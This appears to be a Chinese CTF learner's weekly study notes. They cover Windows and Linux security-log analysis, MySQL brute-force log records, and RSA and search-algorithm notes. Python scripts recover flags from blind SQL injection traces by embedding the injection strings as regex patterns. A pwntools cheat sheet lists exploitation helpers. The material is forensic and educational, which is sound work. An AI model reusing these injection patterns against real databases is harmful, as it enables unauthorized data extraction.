class="line">—————————————————————————————————————————</span><br><span class="line">安全Security</span><br><span class="line"></span><br><span class="line">4624，表示成功登陆的用户，用来筛选该系统的用户登陆成功情况。</span><br><span class="line"></span><br><span class="line">4625，表示登陆失败的用户，用来判断RDP爆破的情况。</span><br><span class="line"></span><br><span class="line">4672，表示授予了特殊权限</span><br><span class="line"></span><br><span class="line">4720,4722,4723,4724,4725,4726,4738,4740，事件ID表示当用户帐号发生创建，删除，改变密码时的事件记录。</span><br><span class="line"></span><br><span class="line">4727,4737,4739,4762，表示当用户组发生添加、删除时或组内添加成员时生成该事件。</span><br></pre></td></tr></table></figure>

<h3 id="事件日志级别"><a href="#事件日志级别" class="headerlink" title="事件日志级别"></a>事件日志级别</h3><ul>
<li>右侧界面-筛选当前日志</li>
<li>级别<ul>
<li>关键</li>
<li>警告</li>
<li>详细</li>
<li>错误</li>
<li>信息</li>
</ul>
</li>
<li>关键字<ul>
<li>审核成功</li>
<li>审核失败</li>
</ul>
</li>
<li>日志格式<ul>
<li>头字段<ul>
<li>安全日志来源一般不看</li>
</ul>
</li>
<li>描述字段<ul>
<li>即，详细信息。日志内容更为丰富，分析重点。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="本地安全策略"><a href="#本地安全策略" class="headerlink" title="本地安全策略"></a>本地安全策略</h3><blockquote>
<p><a href="https://zhidao.baidu.com/question/1456141685192264220.html">如何把Win7家庭普通版升级成Win7旗舰专业版_百度知道 (baidu.com)</a></p>
</blockquote>
<ul>
<li><p>家庭版可能没有</p>
</li>
<li><p>命令行查看<code>secpol.msc</code></p>
</li>
<li><p>审核策略类别</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>审核策略</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>审核账户登录事件</strong></td>
<td>审核任何登录到其他计算机的账户登录与注销事件。</td>
</tr>
<tr>
<td>审核账户管理</td>
<td>审核对用户、组、计算机的管理事件。</td>
</tr>
<tr>
<td>审核目录服务访问</td>
<td>审核AD环境中设置有系统访问控制列表的AD对象。</td>
</tr>
<tr>
<td><strong>审核登录事件</strong></td>
<td>审核用户账户登录与注销事件。</td>
</tr>
<tr>
<td>审核对象访问</td>
<td>审核用户账户访问对象的事件。</td>
</tr>
<tr>
<td>审核策略更改</td>
<td>审核用户账户的权限分配策略、审核策略以及信任策略更改的事件。</td>
</tr>
<tr>
<td>审核特权使用</td>
<td>审核用户执行由“用户权限分配”中制定权限的事件。</td>
</tr>
<tr>
<td>审核过程跟踪</td>
<td>审核程序、进程、句柄及对象访问等详细事件。</td>
</tr>
<tr>
<td>审核系统事件</td>
<td>审核用户重新启动或关闭计算机、或者对系统安全及安全日志有关的事件。</td>
</tr>
</tbody></table>
<ul>
<li><p>账户类型</p>
<ul>
<li>域账户：存储在AD中</li>
<li>本地账户：存储在本地的SAM文件中</li>
</ul>
</li>
<li><p>登录事件详解</p>
<ul>
<li>登录会话类型（5）</li>
<li>事件类型（9）<ul>
<li>右键-看事件属性</li>
</ul>
</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>登录类型</th>
<th>登录权限</th>
<th>典型情况</th>
</tr>
</thead>
<tbody><tr>
<td>本地交互式：使用本地的控制台登录</td>
<td>本地登录</td>
<td>使用域或者本地账户登录本地主机</td>
</tr>
<tr>
<td>网络方式：从网络上的某个主机访问windows资源</td>
<td>从网络访问主机</td>
<td>例如访问一台主机的某个共享文件夹</td>
</tr>
<tr>
<td>远程交换式：通过远程桌面、终端服务或远程帮助登录某个远程主机</td>
<td>运行通过终端服务登录</td>
<td>使用本地mstsc客户端远程登录某台主机</td>
</tr>
<tr>
<td>批作业：用于作为一个指定的账户来运行一个计划任务</td>
<td>作为批作业登录</td>
<td>指定计划任务时指定的以某个具体账户来运行</td>
</tr>
<tr>
<td>服务方式：用于以指定的账户来运行某个服务</td>
<td>以服务方式登录</td>
<td>指在指定服务运行时以本地系统账户或者是具体某个账户运行</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>登录类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>登录类型2</td>
<td>交互式登录（Interactive）</td>
</tr>
<tr>
<td>登录类型3</td>
<td>网络（Network）</td>
</tr>
<tr>
<td>登录类型4</td>
<td>批处理（Batch）</td>
</tr>
<tr>
<td>登录类型5</td>
<td>服务（Service）</td>
</tr>
<tr>
<td>登录类型7</td>
<td>解锁（Unlock）</td>
</tr>
<tr>
<td>登录类型8</td>
<td>网络明文（NetworkCleartext）</td>
</tr>
<tr>
<td>登录类型9</td>
<td>新凭证（NewCredentials）</td>
</tr>
<tr>
<td>登录类型10</td>
<td>远程交互（RemoteInteractive）</td>
</tr>
<tr>
<td>登录类型11</td>
<td>缓存交互（CachedInteractive）</td>
</tr>
</tbody></table>
<ul>
<li>失败事件<ul>
<li><code>ID4625</code></li>
<li>查看<code>子ID</code></li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>子ID</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>0xC000006A</td>
<td>Anincorrect password was supplied</td>
</tr>
<tr>
<td>0xC000006F</td>
<td>Theaccount is not allowed to log on at this time</td>
</tr>
<tr>
<td>0xC0000064</td>
<td>Theaccount does not exist</td>
</tr>
<tr>
<td>0xC0000070</td>
<td>Theaccount is not allowed to log on from this computer</td>
</tr>
<tr>
<td>0xC0000071</td>
<td>Thepassword has expired</td>
</tr>
<tr>
<td>0xC0000072</td>
<td>Theaccount is disabled</td>
</tr>
</tbody></table>
<h2 id="Linux安全日志"><a href="#Linux安全日志" class="headerlink" title="Linux安全日志"></a>Linux安全日志</h2><ul>
<li>常见日志分类</li>
<li>日志的优先级</li>
<li><code>message</code>日志<ul>
<li><code>egrep -ri &#39;error|warn&#39; /var/log/messages</code></li>
</ul>
</li>
<li><code>maillog</code>邮件相关日志<ul>
<li><code>cat mallog</code></li>
</ul>
</li>
<li><code>secure</code>日志<ul>
<li>记载系统安全信息。最典型的就是登录情况。</li>
<li>登录成功与否；账号的增删改情况。</li>
</ul>
</li>
<li><code>boot.log</code><ul>
<li>该日志主要记载系统启动过程</li>
</ul>
</li>
<li><code>Boot.log</code><ul>
<li>该日志主要记载系统启动过程</li>
</ul>
</li>
<li><code>last.log</code><ul>
<li>最近一次成功登陆记录</li>
</ul>
</li>
<li>……</li>
</ul>
<h2 id="IIS日志分析-Mysql日志分析"><a href="#IIS日志分析-Mysql日志分析" class="headerlink" title="IIS日志分析+Mysql日志分析"></a>IIS日志分析+Mysql日志分析</h2><blockquote>
<p>跟web整个攻击思路比较类似。</p>
<p><a href="https://www.secpulse.com/archives/107874.html">MySQL日志安全分析技巧 - SecPulse.COM | 安全脉搏</a></p>
</blockquote>
<p>访问 <code>/test.php?id=1</code>，此时我们得到这样的日志：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">190604 14:46:14       14 Connect    root@localhost on</span><br><span class="line">                      14 Init DB    test   </span><br><span class="line">                      14 Query    SELECT * FROM admin WHERE id = 1     </span><br><span class="line">                      14 Quit</span><br></pre></td></tr></table></figure>

<p>第一列：Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。<br>第二列：Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。<br>第三列：Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。<br>第四列：Argument，详细信息，例如 Connect  root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。</p>
<p>MySQL中的<code>log</code>记录是这样子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Time                 Id        Command         Argument</span><br><span class="line">190601 22:03:20     98 Connect  root@192.168.204.1 on</span><br><span class="line">        98 Connect  Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        103 Connect  mysql@192.168.204.1 on       </span><br><span class="line">        103 Connect  Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        104 Connect  mysql@192.168.204.1 on       </span><br><span class="line">        104 Connect  Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        100 Connect  root@192.168.204.1 on       </span><br><span class="line">        101 Connect  root@192.168.204.1 on       </span><br><span class="line">        101 Connect  Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)       </span><br><span class="line">        99 Connect  root@192.168.204.1 on        </span><br><span class="line">        99 Connect  Access denied for user &#x27;root&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        105 Connect  mysql@192.168.204.1 on       </span><br><span class="line">        105 Connect  Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        100 Query  set autocommit=0      </span><br><span class="line">        102 Connect  mysql@192.168.204.1 on       </span><br><span class="line">        102 Connect  Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)      </span><br><span class="line">        100 Quit</span><br></pre></td></tr></table></figure>

<p>利用爆破工具，一个口令<strong>猜解成功</strong>的记录是这样子的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">190601 22:03:20     100 Connectroot@192.168.204.1 on</span><br><span class="line">   100 Queryset autocommit=0   </span><br><span class="line">   100 Quit</span><br></pre></td></tr></table></figure>

<p>其他方式登录成功的记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Navicat for MySQL登录：</span><br><span class="line">190601 22:14:07  106 Connectroot@192.168.204.1 on         </span><br><span class="line">         106 QuerySET NAMES utf8</span><br><span class="line">         106 QuerySHOW VARIABLES LIKE &#x27;lower_case_%&#x27;         </span><br><span class="line">         106 QuerySHOW VARIABLES LIKE &#x27;profiling&#x27;         </span><br><span class="line">         106 QuerySHOW DATABASES</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 命令行登录</span><br><span class="line">190601 22:17:25  111 Connectroot@localhost on</span><br><span class="line">         111 Queryselect @@version_comment limit 1</span><br><span class="line">         190601 22:17:56  111 Quit</span><br></pre></td></tr></table></figure>

<p><strong>登录失败</strong>的记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">102 Connect  mysql@192.168.204.1 on </span><br><span class="line">102 Connect  Access denied for user &#x27;mysql&#x27;@&#x27;192.168.204.1&#x27; (using password: YES)</span><br></pre></td></tr></table></figure>



<h1 id="230321"><a href="#230321" class="headerlink" title="230321"></a>230321</h1><h2 id="日志分析题目流程"><a href="#日志分析题目流程" class="headerlink" title="日志分析题目流程"></a>日志分析题目流程</h2><h3 id="Windows日志分析"><a href="#Windows日志分析" class="headerlink" title="Windows日志分析"></a>Windows日志分析</h3><ul>
<li>关键字<code>3389</code> -&gt; 远程连接 -&gt; 登录类型 <code>10</code></li>
<li>先筛选<code>529</code>失败的</li>
<li>再筛选<code>528</code>成功的</li>
<li>两者结合查看，查找到登录IP<code>192.168.152.1</code>以及初次登录时间为<code>2015/10/21 16:11:34</code></li>
</ul>
<h3 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h3><ul>
<li>利用<code>notepad++</code>，进行<code>标记</code>以及<code>过滤</code><ul>
<li>标记</li>
<li>同时标记所在行</li>
<li><code>搜索</code> -&gt; <code>删除未标记行</code></li>
</ul>
</li>
<li>关键字<code>failed</code> 、<code>accepted</code>进行综合分析</li>
<li><code>192.168.4.23</code></li>
<li><code>Nov 19 17:28:47</code></li>
</ul>
<h1 id="230323"><a href="#230323" class="headerlink" title="230323"></a>230323</h1><h2 id="复现-日志分析"><a href="#复现-日志分析" class="headerlink" title="复现-日志分析"></a>复现-日志分析</h2><blockquote>
<p>均用<code>notepad++</code></p>
</blockquote>
<h3 id="IIS日志分析"><a href="#IIS日志分析" class="headerlink" title="IIS日志分析"></a>IIS日志分析</h3><ul>
<li>大概看过一遍所给文件</li>
<li>中间存在<code>admin</code>，先把相关条目过滤出来</li>
<li>再看下大概，发现存在大量<code>404</code>，利用<code>200</code>过滤出来</li>
<li>可以直接利用正则匹配<code>admin.*200</code>过滤</li>
</ul>
<h3 id="sql日志分析"><a href="#sql日志分析" class="headerlink" title="sql日志分析"></a>sql日志分析</h3><blockquote>
<p>布尔盲注</p>
</blockquote>
<ul>
<li>先过滤出<code>flag_is_here</code>关键字</li>
<li>再过滤出响应码为<code>200</code>的数据</li>
<li>可以看出是<code>布尔盲注</code></li>
<li>可以直接看出具体的数值<code> flag_list = [102, 108, 97, 103, 123, 115, 113, 108, 109, 48, 112, 95, 53, 49, 95, 112, 48, 119, 101, 114, 102, 117, 108, 125]</code>，写脚本稍微转换可得<code>flag&#123;sqlm0p_51_p0werful&#125;</code></li>
<li>写脚本提取转换</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;access.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">lines = f.readlines()</span><br><span class="line">datas = []</span><br><span class="line"></span><br><span class="line">flag_dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    matchObj = re.search(<span class="string">r&#x27;LIMIT 0,1\),(.*?),1\)\)&gt;(.*?) AND&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> matchObj:</span><br><span class="line">        flag = <span class="built_in">int</span>(matchObj.group(<span class="number">1</span>))</span><br><span class="line">        value = <span class="built_in">int</span>(matchObj.group(<span class="number">2</span>)) + <span class="number">1</span></span><br><span class="line">        flag_dic[flag] = value</span><br><span class="line">    <span class="built_in">print</span>(flag_dic)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> flag_dic.values():</span><br><span class="line">    flag += <span class="built_in">chr</span>(value)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="sql时间盲注"><a href="#sql时间盲注" class="headerlink" title="sql时间盲注"></a>sql时间盲注</h3><ul>
<li>用工具进行<code>url-decode</code></li>
<li>利用<code>sleep(3)</code>继续过滤，最后得到符合条件的数据</li>
<li>观察发现，里面时间相同的可能为<code>flag</code></li>
<li>写脚本进行提取</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;sql&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">lines = f.readlines()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># print(lines[0])</span></span><br><span class="line"><span class="comment"># 正则匹配得到相关数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lines)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f1 = re.search(<span class="string">r&#x27;(\d+:\d+:\d+) -0500] \&quot;GET /web/admin/sql.php\?id=-1 union select 1,IF\(MID\(\(select f1ag from f1ag limit 0,1\),\d+,1\)\=binary\(\&#x27;(.*?)\&#x27;\)&#x27;</span>, lines[i-<span class="number">1</span>])</span><br><span class="line">        f2 = re.search(<span class="string">r&#x27;(\d+:\d+:\d+) -0500] \&quot;GET /web/admin/sql.php\?id=-1 union select 1,IF\(MID\(\(select f1ag from f1ag limit 0,1\),\d+,1\)\=binary\(\&#x27;(.*?)\&#x27;\)&#x27;</span>, lines[i])</span><br><span class="line">        <span class="comment"># print(f1)</span></span><br><span class="line">        <span class="keyword">if</span> f1[<span class="number">1</span>] == f2[<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(f1[<span class="number">1</span>])</span><br><span class="line">            flag += f1[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>字典设置键值之后可以不停替换<code>value</code></p>
<p>适合直接键值固定但<code>value</code>不固定的盲注。</p>
<h1 id="230327"><a href="#230327" class="headerlink" title="230327"></a>230327</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x=pow(m,p,n)</span><br><span class="line">y=pow(m,q,n)</span><br><span class="line">x=m^p%n 一</span><br><span class="line">y=m^q%n 二</span><br><span class="line"></span><br><span class="line">x=m^p%n</span><br><span class="line">两边同时平方个q</span><br><span class="line">x^q=(m^p)^q%n</span><br><span class="line">x^q=m^n%n</span><br><span class="line">x^q=(m^q)^p%n</span><br><span class="line">x^q=(m^q%n)^p%n</span><br><span class="line">将式 二代入</span><br><span class="line">x^q=y^p%n</span><br><span class="line">两边同时平方个p</span><br><span class="line">(x^q)^p=(y^p)^p%n</span><br><span class="line">x^(q*p)=(y^p)^p%n</span><br><span class="line">x^n=(y^p)^p%n</span><br><span class="line"></span><br><span class="line">x^n=(y^p)^p+kn</span><br><span class="line">x^n=(y^p)^p+kpq</span><br><span class="line">#两边同时模p</span><br><span class="line">x^n%p=(y^p)^p%p+kpq%p</span><br><span class="line">x^n%p=(y^p)^p%p</span><br><span class="line">#根据费马小定理</span><br><span class="line">a^p-1%p=1 a^p%p=a</span><br><span class="line">x^n%p=(y^p)%p</span><br><span class="line">x^n%p=y%p</span><br><span class="line">x^n=y+kp</span><br><span class="line">x^n-y=kp</span><br><span class="line">kp=x^n-y</span><br><span class="line">利用公约数求p</span><br><span class="line">p=gcd(x^n-y,n)</span><br></pre></td></tr></table></figure>

<h1 id="230404"><a href="#230404" class="headerlink" title="230404"></a>230404</h1><h2 id="黄金分割查找法"><a href="#黄金分割查找法" class="headerlink" title="黄金分割查找法"></a>黄金分割查找法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fib = <span class="keyword">lambda</span> n: n <span class="keyword">if</span> n &lt; <span class="number">2</span> <span class="keyword">else</span> fib(n-<span class="number">1</span>) + fib(n-<span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fib_search</span>(<span class="params">arr, x</span>):</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="built_in">len</span>(arr) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> fib(key) &lt; <span class="built_in">len</span>(arr):</span><br><span class="line">        key += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">        mid = <span class="built_in">min</span>(left + fib(key - <span class="number">1</span>), <span class="built_in">len</span>(arr) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> x &lt; arr[mid]:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">            key -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> x &gt; arr[mid]:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">            key -= <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fib_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>]</span><br><span class="line">flag_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_list:</span><br><span class="line">    flag += <span class="built_in">str</span>(fib_search(fib_list, x=i))</span><br><span class="line"><span class="comment"># assert len(flag) == 32</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># arr为使用的斐波那契数列</span></span><br><span class="line"><span class="comment"># x为使用的查询密钥</span></span><br></pre></td></tr></table></figure>

<h1 id="230406"><a href="#230406" class="headerlink" title="230406"></a>230406</h1><h2 id="哈希查找法"><a href="#哈希查找法" class="headerlink" title="哈希查找法"></a>哈希查找法</h2><p>$$<br>H &#x3D; f(key)<br>$$</p>
<p><em>哈希表存储位置主要由key来确定</em></p>
<p>具体的介绍主要看OneNote-2023-04-04</p>
<ol>
<li>构建哈希表<ol>
<li>直接定址法</li>
<li>数字分析法</li>
<li>平方取中法</li>
<li>折叠法<ol>
<li>移位折叠</li>
<li>间界折叠</li>
</ol>
</li>
<li>除留余数法</li>
<li>随机数法</li>
</ol>
</li>
<li>处理冲突<ol>
<li>开放定址法<ol>
<li>线性探测法</li>
<li>二次探测法</li>
<li>伪随机数探测法</li>
</ol>
</li>
<li>再哈希法</li>
<li>链地址法</li>
<li>建立公共溢出区</li>
</ol>
</li>
</ol>
<h2 id="分块查找法"><a href="#分块查找法" class="headerlink" title="分块查找法"></a>分块查找法</h2><blockquote>
<p>索引查找法</p>
</blockquote>
<p>类似数据库中的索引查找，算法核心依旧是线性查找。</p>
<ol>
<li>进行分块<ol>
<li>分块数目自定</li>
<li>块内无序，块外有序，整体升序或者降序</li>
<li>前一块的max，必须小于后一块的min</li>
</ol>
</li>
<li>建立索引表</li>
</ol>
<h2 id="临时换源"><a href="#临时换源" class="headerlink" title="临时换源"></a>临时换源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://pypi.tuna.tsinghua.edu.cn/simple #清华</span><br><span class="line">https://pypi.mirrors.ustc.edu.cn/simple/ #中国科技大学</span><br><span class="line">https://mirrors.aliyun.com/pypi/simple/ #阿里</span><br><span class="line">http://pypi.douban.com/simple/ #豆瓣</span><br></pre></td></tr></table></figure>

<h1 id="230407"><a href="#230407" class="headerlink" title="230407"></a>230407</h1><h2 id="存在zsh-history报错"><a href="#存在zsh-history报错" class="headerlink" title="存在zsh_history报错"></a>存在zsh_history报错</h2><blockquote>
<p><code>zsh: corrupt history file ~/.zsh_history</code></p>
<p>存在上述报错，基本因为关机的时候啥都没退，导致中断保存，再开启时就出现如上报错信息。</p>
</blockquote>
<p>上网查找报错信息有各种方法，但当前选择了最简单直接的方法，就直接暴力删除原始文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /home/kali/.zsh_history</span><br></pre></td></tr></table></figure>

<h1 id="230331"><a href="#230331" class="headerlink" title="230331"></a>230331</h1><p>密钥爆破 &lt;- 伪加密 &lt;- 掩码爆破</p>
<h2 id="掩码爆破"><a href="#掩码爆破" class="headerlink" title="掩码爆破"></a>掩码爆破</h2><p>已知密码是这串字符，你知道如何爆破出来嘛？</p>
<p>提示：都是小写字母。</p>
<p><strong>do_u_like_xxx</strong></p>
<h1 id="230411"><a href="#230411" class="headerlink" title="230411"></a>230411</h1><h2 id="vscode运行sagemath"><a href="#vscode运行sagemath" class="headerlink" title="vscode运行sagemath"></a>vscode运行sagemath</h2><blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/297736314">vscode+jupyternotebook+sagemath配置 - 知乎 (zhihu.com)</a></p>
</blockquote>
<p>主要原理就是直接利用sagemath自带的notebook（jupyter）的server运行代码。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230411193506218.png" class="" title="image-20230411193506218">

<p>红框内直接打开运行。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230411193546560.png" class="" title="image-20230411193546560">



<p>运行得到<code>本地地址 + token</code>的形式，我们主要利用这样一串字符串进行调用。</p>
<p>打开<code>vsCode</code>，前置准备比如vscode配置python啥的，修改代码颜色啥的就不提了。</p>
<p>直接到切换<strong>configuration</strong>一步。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230411193821262.png" class="" title="image-20230411193821262">

<p>SageMath 9.3为我们调用服务器之后出现的配置。</p>
<p>选择<code>Select</code>，选择<code>Existing</code>选项。把上面一串带<code>token</code>的字符串直接输入，然后等待连接，即可完成配置，重启一下，即可在<code>vscode</code>中使用<code>sagemath</code>。</p>
<p>新建文件后缀名为<code>.ipynb</code>，然后就可以按照像<code>sagemath-notebook</code>一样进行操作，使用python的代码颜色，能够直接像<code>pycharm</code>一样识别一些函数，但有时候又不会显示。</p>
<p>总体来说，比最原始的shell以及notebook，要更为方便一点。</p>
<p><em>我很满意，甚至想把pycharm也给换了，用vscode运行python代码。不过先继续尝试吧，找到合适的使用方法。</em></p>
<h1 id="230412"><a href="#230412" class="headerlink" title="230412"></a>230412</h1><h2 id="一些数学概念"><a href="#一些数学概念" class="headerlink" title="一些数学概念"></a>一些数学概念</h2><h3 id="平凡"><a href="#平凡" class="headerlink" title="平凡"></a>平凡</h3><p>平凡就是指最简单的情形，或者说是容易证明的、容易看到的。</p>
<h3 id="非平凡"><a href="#非平凡" class="headerlink" title="非平凡"></a>非平凡</h3><p>非零解？</p>
<h3 id="退化"><a href="#退化" class="headerlink" title="退化"></a>退化</h3><p>“退化”的话，在数学里面有“不可逆”、“不满秩”这样的含义。它一般跟“某个量等于0”有关。</p>
<h2 id="pwntools的使用"><a href="#pwntools的使用" class="headerlink" title="pwntools的使用"></a>pwntools的使用</h2><h3 id="context模块使用"><a href="#context模块使用" class="headerlink" title="context模块使用"></a>context模块使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">context.clear()	        ## 清除当前运行时变量</span><br><span class="line">context.arch = ‘arm’	## 设置架构：amd64、i386、arm、mips</span><br><span class="line">context.os = ‘linux’	## 设置操作系统：linux</span><br><span class="line">context.bits=‘32’	    ## 设置 32 位或 64 位：32、64</span><br><span class="line">context.endian=‘little’	## 设置字节序：little、big</span><br><span class="line">context.update(os=‘linux’, arch=‘amd64’, bits=64) ## 更新当前运行时变量</span><br><span class="line">context.log_level=‘debug’	                      ## 设置日志级别：debug、info</span><br><span class="line">context.log_file=‘/tmp/pwnlog.txt’	              ## 设置日志保存文件</span><br></pre></td></tr></table></figure>

<h3 id="tube模块使用"><a href="#tube模块使用" class="headerlink" title="tube模块使用"></a>tube模块使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- 常用命令</span><br><span class="line">## 连接</span><br><span class="line">  remote(&#x27;ip&#x27;,端口)：远程</span><br><span class="line">  process()：本地</span><br><span class="line">## 发送</span><br><span class="line">  send(data) : 发送数据</span><br><span class="line">  sendline(data) : 发送一行数据，相当于在数据末尾加\n</span><br><span class="line">  sendafter(xxx,data)：接收到 xxx 之后发送 data</span><br><span class="line">## 接收</span><br><span class="line">  recv(numb=4096, timeout=default) : 接收指定字节</span><br><span class="line">  recvline(keepends=True) : 接收一行，keepends为是否保留行尾的\n</span><br><span class="line">  recvuntil(delims, drop=False) : 一直读到 delims 的 pattern 出现为止</span><br><span class="line">  recvrepeat(timeout=default) : 持续接受直到EOF或timeout</span><br><span class="line">## 交互</span><br><span class="line">  interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br></pre></td></tr></table></figure>

<h3 id="模块中其他函数"><a href="#模块中其他函数" class="headerlink" title="模块中其他函数"></a>模块中其他函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interactive()	  ## 交互模式，能够同时读写管道，通常在获得 shell 之后调用</span><br><span class="line">recv(numb=1096, timeout=default)  ## 接受最多 numb 字节的数据</span><br><span class="line">recvn(numb, timeout=default)	  ## 接受 numb 字节的数据</span><br><span class="line">recvall()	                      ## 接受数据直到 EOF</span><br><span class="line">recvline(keepends=True)	          ## 接受一行，可选择是否保留行尾的 ‘\n’</span><br><span class="line">recvrepeat(timeout=default)	      ## 接受数据直到 EOF 或 timeout</span><br><span class="line">recvuntil(delims,timeout=default) ## 接受数据直到 delims 出现</span><br><span class="line">send(data)	      ## 发送数据</span><br><span class="line">sendafter(delim, data, timeout=default)	 ## 相当于 recvuntil(delim, timeout) 和 send(data) 的组合</span><br><span class="line">sendline(data)	  ## 发送一行，默认在行尾加 “\n”</span><br><span class="line">sendlineafter(delim, data, timeout=default)	## 相当于 recvuntil(delim, timeout) 和 sendline(data) 的组合</span><br><span class="line">close()	          ## 关闭管道</span><br></pre></td></tr></table></figure>

<h1 id="230413"><a href="#230413" class="headerlink" title="230413"></a>230413</h1><p>读论文。</p>
<h2 id="一点疑问"><a href="#一点疑问" class="headerlink" title="一点疑问"></a>一点疑问</h2><blockquote>
<p>p % (q - 1) &#x3D;&#x3D;? p - q + 1 </p>
</blockquote>
